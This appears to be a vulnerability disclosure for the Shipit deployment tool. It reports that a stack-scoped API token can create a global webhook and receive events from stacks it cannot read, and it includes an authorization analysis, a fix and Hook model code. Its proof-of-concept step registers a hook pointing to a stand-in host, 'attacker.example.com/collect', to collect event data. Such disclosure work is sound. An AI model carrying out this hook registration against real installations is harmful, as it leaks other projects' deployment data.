### Title
Stack-scoped ApiClient token can create a global Hook and exfiltrate event data from every stack it is not authorized to access - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::ApiClient` tokens can be minted scoped to a single stack (`ApiClient#stack_id`), and `Api::BaseController#stacks` is meant to confine such a client to that one stack for every stack-scoped resource. However, the `Hook` resource is also exposed through a top-level, non-stack-scoped route, and `Api::HooksController` never checks `current_api_client.stack_id?` before letting the client operate on **global** hooks (`stack_id: nil`). A client scoped to stack A can therefore create a global hook whose delivery URL is attacker-controlled; that hook will subsequently receive event payloads for **every** stack in the installation, not just stack A.

### Finding Description
`config/routes.rb` mounts `Hook` both nested under a stack and at the API root: [1](#0-0) 

`Api::HooksController#stack_id` derives the scoping key purely from the `params[:stack_id]` of the current request, not from the authenticated client's own binding: [2](#0-1) 

When the top-level `/api/hooks` route is used (no `stack_id` param), `stack_id` returns `nil`, so `hooks` becomes `Hook.where(stack_id: nil)` — the collection of **global** hooks. The only authorization check applied is `require_permission :write, :hook` / `:read, :hook`, which is a flat capability check on the token, independent of the stack the token is bound to: [3](#0-2) [4](#0-3) 

By contrast, the stack-bound resources (`stacks`, `deploys`, `tasks`, etc.) are protected because `Api::BaseController#stacks` restricts the visible `Stack` collection to `current_api_client.stack_id` when the client is scoped: [5](#0-4) 

`HooksController` never consults this restriction; it does not verify that a stack-scoped client is prohibited from touching hooks with `stack_id: nil`. Once a global hook exists, `Hook.deliver` fans out events for **every** stack, because `for_stack` matches both the specific stack and any global hook: [6](#0-5) 

So the equality that should hold — *the stack a token is authorized for* == *the stack(s) whose events the hooks it manages can observe* — is broken: a token issued for stack A can create a hook that observes `deploy`, `rollback`, `commit_status`, `merge`, `pull_request`, `lock`, and `task` events for stacks B, C, D, ... that the token was never granted `read:stack` on.

### Impact Explanation
This is a cross-stack authorization escalation: an attacker holding a low-privilege, single-stack `ApiClient` token (e.g. the `here_come_the_walrus` fixture pattern — scoped to one stack) with the `write:hook`/`read:hook` permission can register a hook with a URL they control and receive deploy/rollback/commit/merge/pull_request event payloads (including stack names, commit SHAs, users, statuses) for every other stack managed by the Shipit instance. This matches the "escalation into authorization" / "unauthenticated read of stack state" class of High severity findings, since it grants read access to state of stacks the token's scope explicitly excludes.

### Likelihood Explanation
Any party in possession of a stack-scoped `ApiClient` token that includes `write:hook` (a permission that looks stack-local, and is commonly granted alongside `read:stack`/`deploy:stack` for a single project's automation) can exploit this immediately and repeatably by issuing a single `POST /api/hooks` request; no additional privileges, timing, or race conditions are required.

### Recommendation
In `Api::HooksController` (and anywhere `Hook` global routes are exposed), reject requests from stack-scoped clients (`current_api_client.stack_id?`) attempting to operate on global hooks (`stack_id: nil`), or otherwise force `stack_id` to `current_api_client.stack_id` whenever the client is scoped, mirroring the restriction already applied in `Api::BaseController#stacks`.

### Proof of Concept
1. Issue/obtain an `ApiClient` token bound to `stack_id` = Stack A with permissions `['write:hook']`.
2. `POST /api/hooks` with `{ "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","rollback","commit_status","merge","pull_request"] }` using that token.
3. Because no `stack_id` param is present, `Api::HooksController#stack_id` returns `nil`, so `Hook.create` persists a hook with `stack_id: nil` (global) despite the token being scoped to Stack A only.
4. When any other stack (B, C, ...) deploys, rolls back, or receives a commit status, `Hook.emit` → `Hook.deliver` matches the global hook via `for_stack(stack_id).listening_event(event)` (`where(stack_id: [nil, stack_id])`), and the attacker's `delivery_url` receives that stack's event payload — data the Stack-A-scoped token was never authorized to read.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
